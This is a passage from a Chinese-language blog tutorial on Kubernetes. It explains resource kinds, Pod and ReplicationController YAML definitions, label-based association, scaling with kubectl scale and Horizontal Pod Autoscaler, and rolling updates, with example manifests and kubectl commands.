class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">annotations:</span></span><br><span class="line">    <span class="attr">deployment.kubernetes.io/revision:</span> <span class="string">&quot;1&quot;</span></span><br><span class="line">  <span class="attr">creationTimestamp:</span> <span class="string">&quot;2021-08-03T15:39:14Z&quot;</span></span><br><span class="line">  <span class="attr">generation:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">  <span class="attr">namespace:</span> <span class="string">default</span></span><br><span class="line">  <span class="attr">resourceVersion:</span> <span class="string">&quot;45961&quot;</span></span><br><span class="line">  <span class="attr">uid:</span> <span class="string">b0b01395-9e7f-4cd1-b0d7-0787780d2595</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">progressDeadlineSeconds:</span> <span class="number">600</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">revisionHistoryLimit:</span> <span class="number">10</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line"><span class="string">...</span> <span class="string">...</span></span><br></pre></td></tr></table></figure><p>可以看到相对的就要复杂了很多。</p><h3 id="关键的一点-定义资源类型">关键的一点-定义资源类型</h3><p>上面表格中的kind我特意打了加粗，是因为这一个非常重要的概念，这个概念你搞不清楚，在部署应用的时候你会比较懵逼。我们先运行一下<code>kubectl api-resource</code>来看一下都有哪些类型：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">NAME                            SHORTNAMES  APIVERSION                       NAMESPACED  KIND</span><br><span class="line">bindings                                    v1                               true        Binding</span><br><span class="line">componentstatuses               cs          v1                               false       ComponentStatus</span><br><span class="line">configmaps                      cm          v1                               true        ConfigMap</span><br><span class="line">endpoints                       ep          v1                               true        Endpoints</span><br><span class="line">events                          ev          v1                               true        Event</span><br><span class="line">limitranges                     limits      v1                               true        LimitRange</span><br><span class="line">namespaces                      ns          v1                               false       Namespace</span><br><span class="line">nodes                           no          v1                               false       Node</span><br><span class="line">persistentvolumeclaims          pvc         v1                               true        PersistentVolumeClaim</span><br><span class="line">persistentvolumes               pv          v1                               false       PersistentVolume</span><br><span class="line">pods                            po          v1                               true        Pod</span><br><span class="line">podtemplates                                v1                               true        PodTemplate</span><br><span class="line">replicationcontrollers          rc          v1                               true        ReplicationController</span><br><span class="line">resourcequotas                  quota       v1                               true        ResourceQuota</span><br><span class="line">secrets                                     v1                               true        Secret</span><br><span class="line">serviceaccounts                 sa          v1                               true        ServiceAccount</span><br><span class="line">services                        svc         v1                               true        Service</span><br><span class="line">mutatingwebhookconfigurations               admissionregistration.k8s.io/v1  false       MutatingWebhookConfiguration</span><br><span class="line">validatingwebhookconfigurations             admissionregistration.k8s.io/v1  false       ValidatingWebhookConfiguration</span><br><span class="line">customresourcedefinitions       crd,crds    apiextensions.k8s.io/v1          false       CustomResourceDefinition</span><br><span class="line">apiservices                                 apiregistration.k8s.io/v1        false       APIService</span><br><span class="line">controllerrevisions                         apps/v1                          true        ControllerRevision</span><br><span class="line">daemonsets                      ds          apps/v1                          true        DaemonSet</span><br><span class="line">deployments                     deploy      apps/v1                          true        Deployment</span><br><span class="line">replicasets                     rs          apps/v1                          true        ReplicaSet</span><br><span class="line">statefulsets                    sts         apps/v1                          true        StatefulSet</span><br><span class="line">tokenreviews                                authentication.k8s.io/v1         false       TokenReview</span><br><span class="line">localsubjectaccessreviews                   authorization.k8s.io/v1          true        LocalSubjectAccessReview</span><br><span class="line">selfsubjectaccessreviews                    authorization.k8s.io/v1          false       SelfSubjectAccessReview</span><br><span class="line">selfsubjectrulesreviews                     authorization.k8s.io/v1          false       SelfSubjectRulesReview</span><br><span class="line">subjectaccessreviews                        authorization.k8s.io/v1          false       SubjectAccessReview</span><br><span class="line">horizontalpodautoscalers        hpa         autoscaling/v1                   true        HorizontalPodAutoscaler</span><br><span class="line">cronjobs                        cj          batch/v1                         true        CronJob</span><br><span class="line">jobs                                        batch/v1                         true        Job</span><br><span class="line">certificatesigningrequests      csr         certificates.k8s.io/v1           false       CertificateSigningRequest</span><br><span class="line">leases                                      coordination.k8s.io/v1           true        Lease</span><br><span class="line">endpointslices                              discovery.k8s.io/v1              true        EndpointSlice</span><br><span class="line">events                          ev          events.k8s.io/v1                 true        Event</span><br><span class="line">ingresses                       ing         extensions/v1beta1               true        Ingress</span><br><span class="line">flowschemas                                 flowcontrol.apiserver.k8s.io/v1befalse       FlowSchema</span><br><span class="line">prioritylevelconfigurations                 flowcontrol.apiserver.k8s.io/v1befalse       PriorityLevelConfiguration</span><br><span class="line">ingressclasses                              networking.k8s.io/v1             false       IngressClass</span><br><span class="line">ingresses                       ing         networking.k8s.io/v1             true        Ingress</span><br><span class="line">networkpolicies                 netpol      networking.k8s.io/v1             true        NetworkPolicy</span><br><span class="line">runtimeclasses                              node.k8s.io/v1                   false       RuntimeClass</span><br><span class="line">poddisruptionbudgets            pdb         policy/v1                        true        PodDisruptionBudget</span><br><span class="line">podsecuritypolicies             psp         policy/v1beta1                   false       PodSecurityPolicy</span><br><span class="line">clusterrolebindings                         rbac.authorization.k8s.io/v1     false       ClusterRoleBinding</span><br><span class="line">clusterroles                                rbac.authorization.k8s.io/v1     false       ClusterRole</span><br><span class="line">rolebindings                                rbac.authorization.k8s.io/v1     true        RoleBinding</span><br><span class="line">roles                                       rbac.authorization.k8s.io/v1     true        Role</span><br><span class="line">priorityclasses                 pc          scheduling.k8s.io/v1             false       PriorityClass</span><br><span class="line">csidrivers                                  storage.k8s.io/v1                false       CSIDriver</span><br><span class="line">csinodes                                    storage.k8s.io/v1                false       CSINode</span><br><span class="line">csistoragecapacities                        storage.k8s.io/v1beta1           true        CSIStorageCapacity</span><br><span class="line">storageclasses                  sc          storage.k8s.io/v1                false       StorageClass</span><br><span class="line">volumeattachments                           storage.k8s.io/v1                false       VolumeAttachment</span><br></pre></td></tr></table></figure><p>人都麻了，一堆类型，所以我们只看常用的东西，<strong>搞清楚这个问题：Kubernetes的有哪些类型的资源，如果你对哪一个不清楚想要了解的话可以使用<code>kubectl explain xxx</code>来查看。</strong></p><p>常用的几个比如：</p><ul><li>Deployment</li><li>service</li><li>pod</li><li>ReplicationController</li></ul><p>下面我将着重叙述上述的这四种类型。<strong>个人认为理解的必要性很大</strong></p><h4 id="kind-pod">kind: Pod</h4><p>我们看一下Pod，这是Kubernetes调度资源的最小单位，它是在机器上运行的一系列的容器的组合，由客户端创建并分发到集群中去创建、运行等等。一句话总结：</p><blockquote><p>Pod is a collection of containers that can run on a host. Thisresource is created by clients and scheduled onto hosts.</p></blockquote><p>下面是定义Pod时的重要元素：</p><ul><li><p>apiVersion：声明Kubernetes的API版本，目前是v1</p></li><li><p>kind：声明API对象的类型，这里类型是Pod</p></li><li><p>metadata：设置Pod的元数据</p><ul><li>name：指定Pod的名称，Pod名称必须在Namespace内唯一</li></ul></li><li><p>spec：配置Pod的具体规格</p><ul><li>restartPolicy：设置Pod的重启策略</li><li>volumes：定义挂载在Pod中的目录，<strong>数组形式</strong>，每一项定义一个容器<ul><li>name：挂载在Pod中的目录名称，比如data。<strong>注意pod中所有容器都可以访问到。</strong></li><li>hostPath：宿主机路径，比如/tmp</li></ul></li><li>containers：设置Pod中容器的规格，<strong>数组形式</strong>，每一项定义一个容器('-'开头为一项)<ul><li>name：指定容器的名称，在Pod的定义中唯一</li><li>image：设置容器镜像</li><li>command：设置容器的启动命令</li><li>volumeMounts: 配置挂载数据卷，数组形式，每一项定义一个容器<ul><li>name：挂载名称，比如web_data</li><li>mountPath：/data，<strong>注意这里的路径是Pod中.spec.volumes中定义的volume</strong></li></ul></li><li>ports：设置容器端口，<strong>数组形式</strong>，每一项定义一个容器<ul><li>name：设置端口名称，比如在Pod内唯一，当只配置一个端口的时候，为可选项，否则配置多个端口的时候为必选项</li><li>containerPort：<strong>必选项目</strong>，设置在容器内的端口，有效值范围为0-65536(不包括0和65536)</li><li>protocol：<strong>可选项</strong>，设置端口的网络层协议，TCP或UDP，默认TCP</li><li>hostIP：<strong>可选项</strong>，设置在宿主机上的IP。0.0.0.0代表任意可用的</li><li>hostPort：<strong>可选项</strong>，设置在宿主机的端口，有效值范围为0-65536(不包括0和65536)</li></ul></li></ul></li></ul></li></ul><h5 id="经典hello-world">经典Hello-World</h5><p>下一章会使用SpringCloud项目做一个深入的学习，下来我们先写一个pod资源类型的HelloWorld来简单了解一下流程，在这个pod中包含了Pod基本信息、数据卷信息的使用展示。</p><p>我直接写yaml了，中间会插注释说明。</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span>       <span class="comment"># 声明Kubernetes的API版本</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Pod</span>            <span class="comment"># 声明资源类型为Pod</span></span><br><span class="line"><span class="attr">metadata:</span>            <span class="comment"># 开始设置Pod的元数据</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">pod-demo</span>     <span class="comment"># 设置Pod的名称，该名称应在Namespace内是唯一的</span></span><br><span class="line"><span class="attr">spec:</span>                <span class="comment"># 设置Pod的具体规格</span></span><br><span class="line">  <span class="attr">restartPolicy:</span> <span class="string">Never</span>  <span class="comment"># 设置Pod的重启策略，这里无需重启，容器正常退出就结束</span></span><br><span class="line">  <span class="attr">volumes:</span>           <span class="comment"># 设置数据卷信息</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-data</span></span><br><span class="line">    <span class="attr">hostPath:</span></span><br><span class="line">      <span class="attr">path:</span> <span class="string">/tmp</span></span><br><span class="line">  <span class="attr">containers:</span>        <span class="comment"># 设置Pod的容器规格，呈数组格式(&#x27;- &#x27;开始)，每一项定义一个容器</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">write</span>      <span class="comment"># 指定容器的名称，在Pod中的定义唯一</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;ubuntu:18.04&quot;</span>  <span class="comment"># 设置容器的镜像</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-data</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/buffer</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;echo \&quot;Hello World\&quot; &gt; /buffer/hello.txt&quot;</span>]  <span class="comment"># 设容器的启动命令，这里我们拷贝数据进行数据卷的验证</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">read</span>      <span class="comment"># 再创建一个容器来读取内容</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">&quot;ubuntu:18.04&quot;</span></span><br><span class="line">    <span class="attr">volumeMounts:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">tmp-data</span></span><br><span class="line">      <span class="attr">mountPath:</span> <span class="string">/buffer</span></span><br><span class="line">    <span class="attr">command:</span> [<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;/buffer/hello.txt&quot;</span>]  <span class="comment"># 读取这个文件</span></span><br></pre></td></tr></table></figure><p>上面这个例子中我们定义了一个使用<code>Ubuntu:18.04</code>作为镜像的容器的Pod资源类型，其实上面这个定义的效果就相当于我们docker中<code>docker run --name hello-world ubuntu:18.04 /bin/echo Hello World</code>。</p><p>我们把这个资源创建到Kubernetes中，在pod起来后，使用log命令并指定容器来查看输出：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210812182431428.png"alt="image-20210812182431428" /><figcaption aria-hidden="true">image-20210812182431428</figcaption></figure><p>如果你发现pod报错或者一直维持在创建中的状态，那你可以使用命令<code>kubectl describe pod xxx</code>来查看，这个命令可以做到查询pod的状态以及生命周期事件。</p><h4 id="kind-republication-controller">kind: RepublicationController</h4><blockquote><p><strong>2021/9/7 更新</strong></p><p>在Kubernetes v1.16之前，维护pod的只有RepublicationController，但是在新版本中官方建议使用ReplicaSet来取代RC，二者本质相同，只不过RC只支持等式选择器，而ReplicaSet支持集合式选择器。</p><p>但是官方不建议用户直接使用ReplicaSet，而是使用Deployment，它可以看做是RC的升级版，支持滚动更新(ReplicaSet不支持)、版本记录、回滚、暂停更新等高级特性，所以你也可以大概了解下RC，把重点放在Deployment上。</p></blockquote><blockquote><p><strong>这一节的记录内容非常重要，可以帮助你理解Pod的生命周期、RC的作用、RC的功能。具体来说这一节我将主要叙述RC的如下功能：</strong></p><ul><li>定义方式？</li><li>如何关联RC和Pod？</li><li>如何弹性伸缩和自动伸缩？</li><li>如何实现应用手动升级？</li></ul></blockquote><p>Kubernetes中RC的主要要素包括以下内容：</p><ul><li>kind：声明API对象类型，这里就是Replication Controller</li><li>metadata：设置RC的元数据<ul><li>name： 指定RC的名称，该名称必须在NameSpace中唯一。</li></ul></li><li>spec: 配置RC的具体规格<ul><li>replicas：设置RC控制的Pod副本数目</li><li>selector：指定RC的Label Selector来匹配Pod的Label</li></ul></li><li>template：设置Pod模板，同Pod的定义一致</li></ul><p>ReplicationController(RC)是一个很重要的概念，应用托管在k8s后，为了保证这个应用可以持续的运行，所以有RC，他可以确保任意时刻k8s中都存在指定数量的Pod副本数量(.spec.replicas)，并提供了弹性伸缩、滚动升级等特性。一个定义RC的配置文件如下所示：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span> </span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span> </span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-nginx</span> </span><br><span class="line"><span class="attr">spec:</span> </span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span> <span class="comment"># 设置Pod副本数目为2</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 用来匹配Pod的Label</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span> </span><br><span class="line">  <span class="attr">template:</span> <span class="comment"># Pod模板，相当于Pod定义</span></span><br><span class="line">    <span class="attr">metadata:</span> </span><br><span class="line">      <span class="attr">labels:</span> </span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span> <span class="comment"># 为Pod打Label</span></span><br><span class="line">    <span class="attr">spec:</span> </span><br><span class="line">      <span class="attr">containers:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span> </span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx</span> </span><br><span class="line">        <span class="attr">ports:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span> </span><br></pre></td></tr></table></figure><p>同样，使用<code>kubectl create -f xxx.yaml</code>就可以生效了，你可以使用命令：</p><blockquote><p>kubectl get pod --selector app=nginx --label-columns app</p></blockquote><p>来查看这个RC创建的Pod。</p><p>因为RC中定义了副本数目，所以你删除已经创建的pod他就会新建一个pod来保证replicas的数目。只有你直接删除了rc资源<code>kubectl delete rc xxx</code>他才会删除对应的pod；而如果你想只删除rc而不删除它对应的pods的话，删除的时候需要带上参数<code>--cascade=false</code>。</p><p>当然，你也可以不通过上述写文件，然后create的方式来创建，好比nginx，你也可以直接<code>kubectl run my-nginx --image nginx --replicas 2 --labels app=nginx</code>。</p><h5id="rc使用pod和直接定义pod有什么区别吗">RC使用Pod和直接定义Pod有什么区别吗？</h5><p>一般相对于直接定义一个Pod，更多的是定义一个RC，让RC来创建Pod，有点像工厂模式那味儿啊。上面那个RC的配置文件也可以看出，我们是通过<code>.spec.template</code>来设置Pod模板的，通过这种方式设置Pod有三个要注意的地方：</p><ul><li>不需要指定Pod名称，名称是自动生成且唯一的，你指定了也没用</li><li>Pod模板重启策略必须是Always，这是为了保证Pod的副本数目</li><li>Pod模板的Label不能为空，否则RC无法同Pod模板创建出来的Pod相关联</li></ul><h5id="pod模板可以单独定义吗非得写rc里">Pod模板可以单独定义吗？非得写RC里？</h5><p>Pod模板是可以单独定义的，类型是<code>PodTemplate</code>，一个例子<code>podtemplate.yaml</code>如下：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span> </span><br><span class="line"><span class="attr">kind:</span> <span class="string">PodTemplate</span> </span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">nginx</span> </span><br><span class="line"><span class="attr">template:</span> </span><br><span class="line">  <span class="attr">metadata:</span> </span><br><span class="line">    <span class="attr">labels:</span> </span><br><span class="line">      <span class="attr">name:</span> <span class="string">nginx</span> </span><br><span class="line">  <span class="attr">spec:</span> </span><br><span class="line">    <span class="attr">containers:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="attr">image:</span> <span class="string">nginx</span> </span><br><span class="line">      <span class="attr">name:</span> <span class="string">nginx</span> </span><br><span class="line">      <span class="attr">ports:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span> </span><br></pre></td></tr></table></figure><p>然后我们部署到k8s中:</p><blockquote><p>kubectl create -f podtemplate.yaml</p></blockquote><p>然后你可以查看当前有那些模板：</p><blockquote><p>kubectl get podTemplate nginx</p></blockquote><p>然后你就可以在RC里面直接引用了：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">templateRef:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">nginx</span>  <span class="comment"># 使用templateRef来进行引用</span></span><br></pre></td></tr></table></figure><h5 id="rc和pod之间的关联---label">RC和Pod之间的关联 - Label</h5><p>这俩的关联主要就是通过Label标签来进行的，再看一眼上面那个例子：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span> </span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span> </span><br><span class="line"><span class="attr">metadata:</span> </span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-nginx</span> </span><br><span class="line"><span class="attr">spec:</span> </span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">2</span></span><br><span class="line">  <span class="attr">selector:</span> <span class="comment"># 用来匹配Pod的Label</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">myApp</span> </span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span> </span><br><span class="line">      <span class="attr">labels:</span> </span><br><span class="line">        <span class="attr">app:</span> <span class="string">myApp</span> <span class="comment"># 为Pod打Label</span></span><br><span class="line">        <span class="attr">version:</span> <span class="string">v1</span> <span class="comment"># 你也可以添加其他标签来准确标识</span></span><br><span class="line">        <span class="attr">release:</span> <span class="string">stable</span></span><br><span class="line">    <span class="attr">spec:</span> </span><br><span class="line">      <span class="attr">containers:</span> </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span> </span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx</span> </span><br><span class="line">        <span class="attr">ports:</span> </span><br><span class="line">        <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span> </span><br></pre></td></tr></table></figure><p>我们就是通过<code>.spec.selector</code>来匹配<code>.spec.template.metadata.labels</code>的。有一种比较好的、方便开发的方法：<strong>修改当前Pod的标签</strong></p><p>好比说上面资源部署后，创建了<code>myApp-abcde</code>这个pod，我们进行修改</p><blockquote><p>kubectl label pod myApp-abcde app=debug --overwrite</p></blockquote><p>这样RC就会创建一个新的Pod进行关联，相当于我们有了一个备份的应用可以进行调试了，调试结束后就可以<code>kubectl delete pod xx</code>删除这个pod了。</p><h5 id="rc如何实现手动弹性伸缩">RC如何实现手动弹性伸缩？</h5><p>即横向扩展，在Kubernetes中就是根据负载的高低动态来调整Pod的副本数目，主要是通过<code>kubectl scale</code>命令来完成的。</p><p>好比说你定义了一个RC，他的<code>.spec.replicas</code>值为1，即只有一个副本，那如果后面你想要扩容，你就可以直接手动进行扩容：</p><blockquote><p>kubectl scale replicationcontroller xxx --replicas=n</p></blockquote><p>上面这条命令扩容至<strong>n</strong>个这个RC管理的Pod。特别地，如果<strong>n=0</strong>，那意思就是删除所有这个RC管理的Pod。</p><h5 id="rc如何实现自动伸缩">RC如何实现自动伸缩？</h5><p>手动固然方便，但是人不可能时时刻刻观察这业务的负载，我们就需要更细颗粒度的伸缩控制，那就是自动伸缩了。Kubernetes中通过<code>Horizontal Pod AutoScaler</code>来实现Pod的自动伸缩，该资源主要通过监视和RC关联的Pod的整体资源使用情况，<strong>当匹配了设定的策略的时候，它就会通过RC来调整Pod的副本数目。</strong>示意图如下所示：</p><figure><imgsrc="/img/Kubernetes-集群环境搭建使用及问题记录（二）/image-20210813150034315.png"alt="image-20210813150034315" /><figcaption aria-hidden="true">image-20210813150034315</figcaption></figure><p>在k8sv1.8以下主要使用Heapster来作为性能指标的采集来源，v1.11废弃，后续使用MetricsServer进行指标的采集。具体的工作原理官方解释如下（附上我的渣渣翻译）：</p><blockquote><p>The Horizontal Pod Autoscaler is implemented as a control loop, witha period controlled by the controller manager's<code>--horizontal-pod-autoscaler-sync-period</code> flag (with adefault value of 15 seconds).</p><blockquote><p>Pod横向自动扩展是以控制循环(controlloop)来单位来进行的，这个循环的时间是由<code>--horizontal-pod-autoscaler-sync-period</code>参数控制的，默认为15s</p></blockquote><p>During each period, the controller manager queries the resourceutilization against the metrics specified in eachHorizontalPodAutoscaler definition. The controller manager obtains themetrics from either the resource metrics API (for per-pod resourcemetrics), or the custom metrics API (for all other metrics).</p><blockquote><p>在这每一个作用周期内，控制器(controllermanager)将按照每一个HorizontalPodAutoscaler的配置文件(就是yaml，Kind是horizontalpodautoscaler)定义的指标(比如CPU、内存等)来获取资源的利用率。这些指标的来源包括资源指标API(resoucemetrics API)和自定义的指标API。</p></blockquote><p>... ...</p><p>The autoscaler accesses corresponding scalable controllers (such asreplication controllers, deployments, and replica sets) by using thescale sub-resource.</p><blockquote><p>自动扩展功能通过Scale（Scale是一个用于设置副本数量和查看健康情况的接口）来访问相关的可扩展控制器(比如replicationcontroller、deployments、replica sets)</p></blockquote></blockquote><p>首先我们创建一个RC，<strong>这里说明一下，我写的配置文件没有问题，但是不知道为什么实际实验的时候我出现了成功创建了Pod，但是一直处于ContainerCreating的状态，且describe无报错，docker那边也显示容器正在运行。有相同情况的大佬希望评论一下。</strong></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">ReplicationController</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">my-nginx</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">    <span class="attr">version:</span> <span class="string">v1</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">version:</span> <span class="string">v1</span></span><br><span class="line">     <span class="attr">spec:</span></span><br><span class="line">       <span class="attr">containers:</span></span><br><span class="line">       <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">         <span class="attr">image:</span> <span class="string">nginx</span></span><br><span class="line">         <span class="attr">ports:</span></span><br><span class="line">         <span class="bullet">-</span> <span class="attr">containerPort:</span> <span class="number">80</span></span><br><span class="line">           <span class="attr">protocol:</span> <span class="string">TCP</span></span><br></pre></td></tr></table></figure><p>然后我们使用子命令<code>autoscale</code>来为RC创建HPA：</p><blockquote><p>kubectl autoscale rc my-nginx --min=1 --max=5 --cpu-percent=50</p></blockquote><p>上面的命令含义为</p><ul><li>为名为my-nginx的rc创建HPA</li><li>该HPA策略为若CPU使用率大于50%就进行调整</li><li>该HPA的调整范围最小为1个，最多为5个副本</li></ul><p>创建好的HPA可以使用命令<code>kubectl get hpa</code>来查看。</p><h5 id="rc怎么实现应用的滚动升级">RC怎么实现应用的滚动升级？</h5><p>好比说上面那个配置文件叫<code>my-nginx-v1</code>，假如此刻有5个副本且我们打算把应用升级为<code>my-nginx-v2</code>，如何进行一次性的滚动升级呢？很简单：</p><blockquote><p>kubectl rolling-update my-nginx-v1 -f my-nginx-v2.yaml--update-period=10s</p></blockquote><p>上面这条命令做了什么呢？</p><ul><li>首先根据定义的文件创建V2版本的RC</li><li>每隔10s(<code>--update-period</code>)，逐步增加V2版本的RC副本数并逐渐减少V1版本的副本数</li><li>全部替换完后自动删除V1版本的RC，并保留V2版本的RC</li></ul><p>当然这个过程需要一点点时间，如果你在这个期间发现搞错了也是可以回滚的：</p><blockquote><p>kubectl rolling-update my-nginx-v1 -f my-nginx-v2.yaml--update-period=10s <strong>--rollback</strong></p></blockquote><h4 id="kind-deployment">Kind: 